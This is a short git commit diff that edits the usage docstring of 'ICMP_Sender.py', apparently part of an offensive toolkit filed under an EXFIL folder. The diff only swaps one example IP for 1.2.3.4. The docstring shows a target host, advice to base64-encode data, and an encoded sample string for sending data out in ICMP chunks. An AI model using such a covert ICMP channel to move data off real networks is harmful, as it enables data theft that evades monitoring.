086cdd5a90f01c7eb70054c572473478ffbcac8e
Subinacls <admin@hacker-island.com>
2024-02-08 22:04:09 -0500

    Update ICMP_Sender.py

--- python3/ICMP/EXFIL/ICMP_Sender.py
+++ python3/ICMP/EXFIL/ICMP_Sender.py
@@ -14,7 +14,7 @@ def send_icmp_chunks(host, string):
   Example usage:
     You can use DNS names, however IP Address targets are recommended
       host = "icmp.yourdomain.com"  # DNS Address example
-      host = "44.198.241.44"        # IP Address example
+      host = "1.2.3.4"        # IP Address example
     It would be best to encode the string with base64 before sending it on the wire
       string = "mko8UMkmzx2CjbzKEh03t7CGewYNFZp6NPoU84QkrcLoCL4N1VEdK+fNaTcXF12tlx5rvcZPpqZ7TWGOX5IAL+r/l8hDYzUuvzDDVVWXtP8ehcXHoxAQbiR+b1PJrJ5KslfjEiR0qIz28uMTL0NT8C+OsPSbWTPLDD1L4ZFH2hw6U9BUm0Vt5fkKe5oLsYBkyIHb4M+ujVc18WRS6YXCWQxBTlxlU/jaO+XABfjPFFQ2ybv+8u6ViboONAIcKjDlRnOelPx+t8OYkNBLomBIchxD4jAh0qGqsKqNj71OyBNRitS5SkpB45JHVWMKstoaUTu4hyLx0UxppdHEBK01wAtja9bRCSzi"
     Execute the function with the host and string argument
